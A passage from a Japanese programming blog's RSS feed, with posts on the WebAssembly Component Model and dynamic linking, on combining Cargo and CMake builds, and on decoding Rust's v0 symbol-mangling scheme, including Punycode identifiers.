インターフェースはWIT (Wasm Interface Type) と呼ばれる形式の&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/DSL&quot;&gt;DSL&lt;/a&gt;で書かれ、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Canonical&quot;&gt;Canonical&lt;/a&gt; ABIによってリッチな型はプリミティブな型による表現に変換される。これにより、wasmバイナリレベルでの移植性だけでなく、言語間の移植性が実現できる。
また、線形メモリをインターフェースとして利用することが禁止される。(言語/&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9&quot;&gt;コンパイラ&lt;/a&gt;に依存するバイト列をインターフェースとして使うことを防ぐ)&lt;/p&gt;

&lt;h1 id=&quot;コンポーネントモデル&quot;&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8&quot;&gt;コンポーネント&lt;/a&gt;モデル&lt;/h1&gt;

&lt;h2 id=&quot;ComponentとWorldとModule&quot;&gt;ComponentとWorldとModule&lt;/h2&gt;

&lt;p&gt;用語の整理。Component Modelでは、通常.wasmが使われるWasmモジュールのことを&lt;strong&gt;コア&lt;/strong&gt;モジュールと呼ぶ。
コアモジュールが複数集まったものを&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8&quot;&gt;コンポーネント&lt;/a&gt;と呼ぶ。&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8&quot;&gt;コンポーネント&lt;/a&gt;は、内部のコアモジュールのインポートとエクスポートから構成されるサブ&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8&quot;&gt;コンポーネント&lt;/a&gt;を持つことがある。
&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8&quot;&gt;コンポーネント&lt;/a&gt;の外部インターフェース (importとexport) をワールドと呼ぶ。&lt;/p&gt;

&lt;h2 id=&quot;Quick-Overview&quot;&gt;Quick Overview&lt;/h2&gt;

&lt;p&gt;以下はWITによるWorldの例。&lt;/p&gt;

&lt;pre class=&quot;code wit&quot; data-lang=&quot;wit&quot; data-unlink&gt;interface printer {
    print: func(text: string);
}

interface error-reporter {
    report-error: func(error-message: string);
}

world multi-function-device {
    // The component implements the `printer` interface
    export printer;

    // The component implements the `scan` function
    export scan: func() -&amp;gt; list&amp;lt;u8&amp;gt;;

    // The component needs to be supplied with an `error-reporter`
    import error-reporter;
}&lt;/pre&gt;


&lt;p&gt;Worldはimportとexportに、個々の関数もしくはInterfaceを指定することが出来る。
Interfaceは複数の関数からなる。&lt;/p&gt;

&lt;p&gt;以下のように、外部のパッケージ(ワールドとインターフェースの集合)が持つインターフェースをインポート、エクスポートすることもできる。&lt;/p&gt;

&lt;pre class=&quot;code wit&quot; data-lang=&quot;wit&quot; data-unlink&gt;world http-proxy {
    export wasi:http/incoming-handler;
    import wasi:http/outgoing-handler;
}&lt;/pre&gt;


&lt;p&gt;もちろん、関数だけでなく型も扱うことができる。&lt;/p&gt;

&lt;pre class=&quot;code wit&quot; data-lang=&quot;wit&quot; data-unlink&gt;interface types {
    type dimension = u32;
    record point {
        x: dimension,
        y: dimension,
    }
}

interface canvas {
    use types.{dimension, point};
    type canvas-id = u64;
    draw-line: func(canvas: canvas-id, from: point, to: point, thickness: dimension);
}&lt;/pre&gt;


&lt;h1 id=&quot;Dynamic-Linking&quot;&gt;Dynamic Linking&lt;/h1&gt;

&lt;p&gt;一般的なOSにあるような、コードがよく利用するライブラリをバイナリに含めるのではなく、バイナリ間で共有できるようにする仕組み。コードサイズが小さくできたり、バイナリからライブラリを分離できてセキュリティ的に嬉しいというメリットがある。&lt;/p&gt;

&lt;p&gt;以下の図ではapp, imgmgk, zipperが&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8&quot;&gt;コンポーネント&lt;/a&gt;で、それぞれの&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8&quot;&gt;コンポーネント&lt;/a&gt;は内部に複数のコアモジュールを含む。wasmにおける動的リンクは、ELFのものと異なり、複数の&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8&quot;&gt;コンポーネント&lt;/a&gt;が同じモジュールのコードをシェアできるということにすぎない。&lt;/p&gt;

&lt;p&gt;&lt;figure class=&quot;figure-image figure-image-fotolife&quot; title=&quot;[2]より引用&quot;&gt;&lt;span itemscope itemtype=&quot;http://schema.org/Photograph&quot;&gt;&lt;img src=&quot;https://cdn-ak.f.st-hatena.com/images/fotolife/t/tamaroning/20241110/20241110192401.png&quot; width=&quot;254&quot; height=&quot;150&quot; loading=&quot;lazy&quot; title=&quot;&quot; class=&quot;hatena-fotolife&quot; itemprop=&quot;image&quot;&gt;&lt;/span&gt;&lt;figcaption&gt;Dynamic Linkingの概要 ([2]より引用)&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;つまり、全体としては共有オブジェクト(libc)のコードを1つだけ持つが、共有オブジェクトは各&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8&quot;&gt;コンポーネント&lt;/a&gt;で&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9&quot;&gt;インスタンス&lt;/a&gt;(実行環境)が作成される。&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9&quot;&gt;インスタンス&lt;/a&gt;が複数作られるのは、先程述べた通りモジュール間で線形メモリを共有してはいけないからである。&lt;/p&gt;

&lt;h2 id=&quot;dlopen&quot;&gt;dlopen&lt;/h2&gt;

&lt;p&gt;また、dynamic linkingの一部としてdlopenが使われることが想定される。これまでの話とは異なり、dlopenは&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB&quot;&gt;コンパイル&lt;/a&gt;時にはわからないモジュールを読み込むときに使われることになる。この機能をWASIやJS &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/API&quot;&gt;API&lt;/a&gt;に取り込むことが議論されている。&lt;/p&gt;

&lt;h1 id=&quot;感想&quot;&gt;感想&lt;/h1&gt;

&lt;p&gt;個人的には、libcのようなよく使われる共有ライブラリは実行ファイルが持たずに、ブラウザやランタイムなどの実行する側が持つべきだと思った。jsでは&lt;code&gt;console.log(&quot;...&quot;)&lt;/code&gt;の数バイトで済んでいたコードがwasmだと数&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%AD%A5%ED%A5%D0%A5%A4%A5%C8&quot;&gt;キロバイト&lt;/a&gt;もあるというのは勿体ない気がする。しかし、まだ、libcをどこに持つかは特に定まっていないから今後どうなるのか注目したい。&lt;/p&gt;

&lt;p&gt;また、Tool Conventionsでもdynamic linkingが議論されているが[3]、component modelのものとの違いがよくわかっていないので調べたい。&lt;/p&gt;

&lt;h1 id=&quot;Refs&quot;&gt;Refs&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;[1] Component Model, &lt;a href=&quot;https://component-model.bytecodealliance.org/&quot;&gt;https://component-model.bytecodealliance.org/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;[2] Shared-Everything Dynamic Linking, &lt;a href=&quot;https://github.com/WebAssembly/component-model/blob/5a34794dbe3b958b6a1df415f57b8baaa95f98d3/design/mvp/examples/SharedEverythingDynamicLinking.md&quot;&gt;https://github.com/WebAssembly/component-model/blob/5a34794dbe3b958b6a1df415f57b8baaa95f98d3/design/mvp/examples/SharedEverythingDynamicLinking.md&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;[3] WebAssembly Dynamic Linking, &lt;a href=&quot;https://github.com/WebAssembly/tool-conventions/blob/main/DynamicLinking.md&quot;&gt;https://github.com/WebAssembly/tool-conventions/blob/main/DynamicLinking.md&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>          <pubDate>Sun, 10 Nov 2024 19:50:49 +0900</pubDate>
          <guid isPermaLink="false">hatenablog://entry/6802418398302926764</guid>
          
          <enclosure url="https://cdn.image.st-hatena.com/image/scale/6941c56beb4153a1b22406e4b3eb8b964044e115/backend=imagemagick;version=1;width=1300/https%3A%2F%2Fcdn-ak.f.st-hatena.com%2Fimages%2Ffotolife%2Ft%2Ftamaroning%2F20241110%2F20241110192401.png" type="image/png" length="0" />
        </item>
      
    
      
      
        <item>
          <title>CargoとCMakeのプロジェクトを共存させる</title>
          <link>https://tamaron.hatenablog.com/entry/2024/10/13/230214</link>          <description>&lt;p&gt;方法は以下の3つ&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;CargoとCMakeのプロジェクトを完全に分ける&lt;/li&gt;
&lt;li&gt;corroisionを使う&lt;/li&gt;
&lt;li&gt;cmakeのExternalProjectを使う&lt;/li&gt;
&lt;/ul&gt;


&lt;h2 id=&quot;CargoとCMakeのプロジェクトを完全に分ける&quot;&gt;①CargoとCMakeのプロジェクトを完全に分ける&lt;/h2&gt;

&lt;p&gt;メリット&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;シンプル&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;デメリット&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;開発者がビルドコマンドを2回叩く必要がある&lt;/li&gt;
&lt;/ul&gt;


&lt;h2 id=&quot;corroisionを使う&quot;&gt;②corroisionを使う&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/corrosion-rs/corrosion&quot;&gt;corroison&lt;/a&gt;を使う。&lt;/p&gt;

&lt;p&gt;CMakeプロジェクトがCargoプロジェクトを含む場合にも逆にも適用できる。&lt;/p&gt;

&lt;p&gt;実際に使う例は以下にある。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://tylerjw.dev/posts/rust-cmake-interop-cmake/&quot;&gt;Rust/C++ Interop Part 2 - CMake |&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;メリット&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;導入が簡単&lt;/li&gt;
&lt;li&gt;CargoプロジェクトにもCMakeプロジェクトにも適用できる&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;デメリット&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;全体としてcargoプロジェクトの場合、make installのようなインストールコマンドが使えない (別途&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B9%A5%AF%A5%EA%A5%D7%A5%C8&quot;&gt;スクリプト&lt;/a&gt;を用意するのが面倒)&lt;/li&gt;
&lt;/ul&gt;


&lt;h2 id=&quot;CMakeのExternalProjectを使う&quot;&gt;③CMakeのExternalProjectを使う&lt;/h2&gt;

&lt;p&gt;CMakeの&lt;a href=&quot;https://cmake.org/cmake/help/latest/module/ExternalProject.html&quot;&gt;ExternalProject&lt;/a&gt;を使う。
CMakeプロジェクトがRustプロジェクトを含む形になる。&lt;/p&gt;

&lt;p&gt;外部プロジェクトとして、カスタムのビルドコマンドやフェッチ方法を指定でき、Cargo以外にも対応可能。
一度試したけどやめたほうがいい。&lt;/p&gt;

&lt;p&gt;メリット&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;細かくコマンドを設定できるので、小回りがきく&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;デメリット&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;設定する項目が多くて大変&lt;/li&gt;
&lt;li&gt;Cargoのキャッシュを利用できないため、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9&quot;&gt;ソースコード&lt;/a&gt;を変更してもmakeでビルドできない (頑張ればできるかも?)&lt;/li&gt;
&lt;/ul&gt;

</description>          <pubDate>Sun, 13 Oct 2024 23:02:14 +0900</pubDate>
          <guid isPermaLink="false">hatenablog://entry/6802418398295854035</guid>
          
          <enclosure url="https://ogimage.blog.st-hatena.com/26006613542645241/6802418398295854035/1728828134" type="image/png" length="0" />
        </item>
      
    
      
      
        <item>
          <title>Rustのv0 mangling scheme</title>
          <link>https://tamaron.hatenablog.com/entry/2024/09/13/112659</link>          <description>&lt;p&gt;昨年書きかけていた記事を発掘して、公開しないよりはしたほうがいいと思い、一部加筆修正して公開しました。&lt;/p&gt;

&lt;h1 id=&quot;はじめに&quot;&gt;はじめに&lt;/h1&gt;

&lt;p&gt;この記事はRustの名前マングル方式 (name mangling &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/scheme&quot;&gt;scheme&lt;/a&gt;)についてまとめた記事です。
名前マングルとは、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9&quot;&gt;コンパイラ&lt;/a&gt;が行うシンボル名の変換プロセスのことで、関数などを&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%A2%A5%BB%A5%F3%A5%D6%A5%EA&quot;&gt;アセンブリ&lt;/a&gt;として出力する段階で行われます。
基本的に、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%CC%BE%C1%B0%B6%F5%B4%D6&quot;&gt;名前空間&lt;/a&gt;などをサポートする&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9&quot;&gt;コンパイラ&lt;/a&gt;では名前マングルを行います。&lt;/p&gt;

&lt;p&gt;また、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GDB&quot;&gt;GDB&lt;/a&gt;などのツールにはデマングラが搭載されており、マングルする前の名前を表示してくれます。&lt;/p&gt;

&lt;p&gt;以下は、Rustのマングルの例になります。&lt;/p&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgodbolt.org%2Fz%2FTKs4zsE4G&quot; title=&quot;Compiler Explorer - Rust&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://godbolt.org/z/TKs4zsE4G&quot;&gt;godbolt.org&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;余談ですが、この記事を書いた経緯は、&lt;a href=&quot;https://github.com/Rust-GCC/gccrs&quot;&gt;GCC Rust&lt;/a&gt; 上に v0マングル方式を実装する機会があったことと、マングルに関する日本語の文献がほとんどなかったからです。また、自分用ですがオンラインの&lt;a href=&quot;https://online-demangler-iv5u2bxxb-tamaroning.vercel.app/&quot;&gt;デマングルツール&lt;/a&gt;を作ったので興味のある方は使ってみてください。&lt;/p&gt;

&lt;h1 id=&quot;Rustのマングル方式&quot;&gt;Rustのマングル方式&lt;/h1&gt;

&lt;p&gt;Rustには以下の2種類のマングル方式があります。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Legacy mangling &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/scheme&quot;&gt;scheme&lt;/a&gt;: Rustが始まってから現在でも使われている方式。(&lt;code&gt;_Z&lt;/code&gt;で始まる)&lt;/li&gt;
&lt;li&gt;v0 mangling &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/scheme&quot;&gt;scheme&lt;/a&gt;: 2018年に&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/RFC&quot;&gt;RFC&lt;/a&gt;として提案された方式。(&lt;code&gt;_R&lt;/code&gt;で始まる)&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;この記事で解説するのは、v0 mangling &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/scheme&quot;&gt;scheme&lt;/a&gt;です。legacyは扱いません。&lt;/p&gt;

&lt;h1 id=&quot;Legacyの欠点&quot;&gt;Legacyの欠点&lt;/h1&gt;

&lt;p&gt;legacyはこれまで長らく利用されていましたが、様々な問題を抱えていました。
例えば以下のような問題があります。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;マングル後のシンボル名に&lt;code&gt;$&lt;/code&gt;が含まれるが、一部のプラットホームでサポートされていない&lt;/li&gt;
&lt;li&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9&quot;&gt;コンパイラ&lt;/a&gt;内部の情報に依存している箇所が多い&lt;/li&gt;
&lt;li&gt;一部だけが&lt;a href=&quot;https://refspecs.linuxbase.org/cxxabi-1.86.html#mangling&quot;&gt;ItaniumABI&lt;/a&gt;に準拠しており一貫性がない&lt;/li&gt;
&lt;li&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B8%A5%A7%A5%CD%A5%EA%A5%C3%A5%AF&quot;&gt;ジェネリック&lt;/a&gt;な引数をとる関数について、マングル後のシンボル名から、一部の情報(例えば引数の型)がとれない&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;v0はこれらの問題を解決、緩和することができ、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B5%A1%BC%A5%C9%A5%D1%A1%BC%A5%C6%A5%A3&quot;&gt;サードパーティ&lt;/a&gt;のツールや他の&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9&quot;&gt;コンパイラ&lt;/a&gt;がRustバイナリを扱いやすくなることが期待されます。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;A-Z&lt;/code&gt;, &lt;code&gt;a-z&lt;/code&gt;, &lt;code&gt;0-9&lt;/code&gt;, &lt;code&gt;_&lt;/code&gt; からなるシンボルを生成する&lt;/li&gt;
&lt;li&gt;マングル方式として一貫した定義をもつ&lt;/li&gt;
&lt;li&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9&quot;&gt;コンパイラ&lt;/a&gt;内部の情報への依存を&lt;strong&gt;減らす&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B8%A5%A7%A5%CD%A5%EA%A5%C3%A5%AF&quot;&gt;ジェネリック&lt;/a&gt;な引数を可逆的に&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9&quot;&gt;エンコード&lt;/a&gt;する&lt;/li&gt;
&lt;/ul&gt;


&lt;h1 id=&quot;v0の基本&quot;&gt;v0の基本&lt;/h1&gt;

&lt;p&gt;v0マングルの例として、最も簡単なケースを考えます。
以下の関数&lt;code&gt;foo&lt;/code&gt;をマングルすると&lt;code&gt;_RNvNtCs1234_7mycrate3foo3bar&lt;/code&gt;になります。&lt;/p&gt;

&lt;pre class=&quot;code lang-rust&quot; data-lang=&quot;rust&quot; data-unlink&gt;&lt;span class=&quot;synComment&quot;&gt;// mycrate.rs&lt;/span&gt;
&lt;span class=&quot;synStatement&quot;&gt;mod&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;foo&lt;/span&gt; {
  &lt;span class=&quot;synStatement&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;foo&lt;/span&gt;() {}
}
&lt;/pre&gt;


&lt;p&gt;それでは、このシンボルからマングル前のパス &lt;code&gt;mycrate::foo::bar&lt;/code&gt;を復元してみましょう。&lt;/p&gt;

&lt;h4 id=&quot;1-最初の_Rを取り除く&quot;&gt;1. 最初の&lt;code&gt;_R&lt;/code&gt;を取り除く&lt;/h4&gt;

&lt;p&gt; 最初の&lt;code&gt;_R&lt;/code&gt;はRustのv0マングル方式を表す&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%D7%A5%EC%A5%D5%A5%A3%A5%C3%A5%AF%A5%B9&quot;&gt;プレフィックス&lt;/a&gt;なので取り除きます。&lt;/p&gt;

&lt;p&gt;=&gt;  &lt;code&gt;NvNtCs1234_7mycrate3foo3bar&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&quot;2-外側のNv3barを取り除く&quot;&gt;2. 外側の&lt;code&gt;Nv...3bar&lt;/code&gt;を取り除く&lt;/h4&gt;

&lt;p&gt;&lt;code&gt;Nv&lt;/code&gt;の&lt;code&gt;N&lt;/code&gt;は&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%CC%BE%C1%B0%B6%F5%B4%D6&quot;&gt;名前空間&lt;/a&gt;を表します。&lt;code&gt;v&lt;/code&gt;は特に意味はありません。
&lt;code&gt;3bar&lt;/code&gt;の&lt;code&gt;3&lt;/code&gt;は直後の識別子の文字数を表します。&lt;code&gt;bar&lt;/code&gt;は3文字なので3なわけです。&lt;/p&gt;

&lt;p&gt;=&gt;  &lt;code&gt;NvNtCs1234_7mycrate3foo3bar&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&quot;3-外側のNt3fooを取り除く&quot;&gt;3. 外側の&lt;code&gt;Nt...3foo&lt;/code&gt;を取り除く&lt;/h4&gt;

&lt;p&gt;先程の手順と同様にして、識別子&lt;code&gt;foo&lt;/code&gt;が得られます。これを先程の&lt;code&gt;foo&lt;/code&gt;の前に繋げると、&lt;code&gt;foo::bar&lt;/code&gt;が得られます。&lt;/p&gt;

&lt;p&gt;=&gt;  &lt;code&gt;Cs1234_7mycrate&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&quot;4-クレート名を得る&quot;&gt;4. クレート名を得る&lt;/h4&gt;

&lt;p&gt;&lt;code&gt;C&lt;/code&gt;はクレートを表し、&lt;code&gt;s1234_&lt;/code&gt;はcrate disambiguatorです。
実装上、crate disambiguatorには&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9&quot;&gt;コンパイラ&lt;/a&gt;が管理するユニークな数字が入るようですが別になくても良いです。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;7mycrate&lt;/code&gt;の部分は先程と同じように識別子を表します。この名前を&lt;code&gt;foo::bar&lt;/code&gt;と繋げて、最終的に&lt;code&gt;mycrate::foo::bar&lt;/code&gt;が得られます。&lt;/p&gt;

&lt;h1 id=&quot;v0の規則&quot;&gt;v0の規則&lt;/h1&gt;

&lt;p&gt;Rustでは、先程見たようなクレート名から始まるパス &lt;code&gt;mycrate::foo::bar&lt;/code&gt; を、&lt;a href=&quot;https://doc.rust-lang.org/reference/paths.html#canonical-paths&quot;&gt;正規パス (caninical paths)&lt;/a&gt; と言います。&lt;code&gt;foo&lt;/code&gt;や&lt;code&gt;bar&lt;/code&gt;などの、パスの単位をセグメントと言います。マングルを行う際に必要となるのは、正規パスと単相化 (monomorphization) の際の型情報になります。単相化とは、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B8%A5%A7%A5%CD%A5%EA%A5%C3%A5%AF&quot;&gt;ジェネリック&lt;/a&gt;スなコードを具体的な型に具体化するプロセスのことで、&lt;code&gt;fn foo&amp;lt;T&amp;gt;(_: T);&lt;/code&gt;の場合、&lt;code&gt;[T→i32]&lt;/code&gt;などが具体化の型情報になります。&lt;/p&gt;

&lt;p&gt;マングルする際は正規パスの最初のパスセグメントから順に内側からシンボルを生成し、デマングルする際はシンボルを外側から見ていくため、終端のパスセグメントから正規パスを構築することになります。&lt;/p&gt;

&lt;p&gt;v0のマングル規則はRust &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/RFC&quot;&gt;RFC&lt;/a&gt;にある&lt;a href=&quot;https://rust-lang.github.io/rfcs/2603-rust-symbol-name-mangling-v0.html#syntax-of-mangled-names&quot;&gt;規則表&lt;/a&gt;で定義されています。&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/BNF&quot;&gt;BNF&lt;/a&gt;記法に慣れている方はこちらの方がわかりやすいと思うので、参照してください。&lt;/p&gt;

&lt;h1 id=&quot;Unicodeの識別子&quot;&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Unicode&quot;&gt;Unicode&lt;/a&gt;の識別子&lt;/h1&gt;

&lt;p&gt;先程まで見てきた、&lt;code&gt;foo&lt;/code&gt;や&lt;code&gt;mycrate&lt;/code&gt;は英数字の識別子でした。
Rustは &lt;a href=&quot;https://unicode.org/reports/tr31/&quot;&gt;Unicode Standard Annex #31&lt;/a&gt; に準拠しており、漢字や&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%AD%A5%EA%A5%EB%CA%B8%BB%FA&quot;&gt;キリル文字&lt;/a&gt;などの文字を識別子として使うことができます。こういった文字は、プラットホームやツールの問題により、英数字とアンダースコアに&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9&quot;&gt;エンコード&lt;/a&gt;されることが好ましいです。&lt;/p&gt;

&lt;p&gt;v0ではこの&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9&quot;&gt;エンコード&lt;/a&gt;に &lt;a href=&quot;https://ja.wikipedia.org/wiki/Punycode&quot;&gt;Punycode&lt;/a&gt; の変換規則を利用します。
&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Punycode&quot;&gt;Punycode&lt;/a&gt;は&lt;code&gt;-&lt;/code&gt;(ハイフン)を含むため、厳密にはそのままでは利用可能ではないですが、普通の人は気にしなくても良いでしょう。&lt;/p&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Punycode&quot;&gt;Punycode&lt;/a&gt; を使うと&lt;code&gt;gödel&lt;/code&gt;は&lt;code&gt;u8gdel_5qa&lt;/code&gt;になります。先頭の&lt;code&gt;u&lt;/code&gt;が&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Punycode&quot;&gt;Punycode&lt;/a&gt;で変換された識別子であることを表します。
(詳しい人は気づくかもしれませんが、&lt;code&gt;gdel&lt;/code&gt;は &lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc3492&quot;&gt;RFC3492&lt;/a&gt; の basic string で、 delimtier がアンダースコアになっています)&lt;/p&gt;

&lt;p&gt;余談ですが、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Unicode&quot;&gt;Unicode&lt;/a&gt; の識別子を &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Punycode&quot;&gt;Punycode&lt;/a&gt; でマングルするア&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%A4%A5%C7%A5%A2&quot;&gt;イデア&lt;/a&gt;は Swift のマングル方式を参考にしているようです。&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;Identifiers that contain non-ASCII characters are encoded using the &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Punycode&quot;&gt;Punycode&lt;/a&gt; algorithm specified in &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/RFC&quot;&gt;RFC&lt;/a&gt; 3492, with the modifications that &lt;code&gt;_&lt;/code&gt; is used as the encoding delimiter, and uppercase letters A through J are used in place of digits 0 through 9 in the encoding character set. The mangling then consists of an &lt;code&gt;00&lt;/code&gt; followed by the run length of the encoded string and the encoded string itself. For example, the identifier &lt;code&gt;vergüenza&lt;/code&gt; is mangled to &lt;code&gt;0012vergenza_JFa&lt;/code&gt;. (The encoding in standard &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Punycode&quot;&gt;Punycode&lt;/a&gt; would be &lt;code&gt;vergenza-95a&lt;/code&gt;)&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;(&lt;a href=&quot;https://github.com/apple/swift/blob/9f225d6fa89cad101a8ced83eff08dee8cf17baf/docs/ABI/Mangling.rst#identifiers&quot;&gt;https://github.com/apple/swift/blob/9f225d6fa89cad101a8ced83eff08dee8cf17baf/docs/ABI/Mangling.rst#identifiers&lt;/a&gt; より引用)&lt;/p&gt;

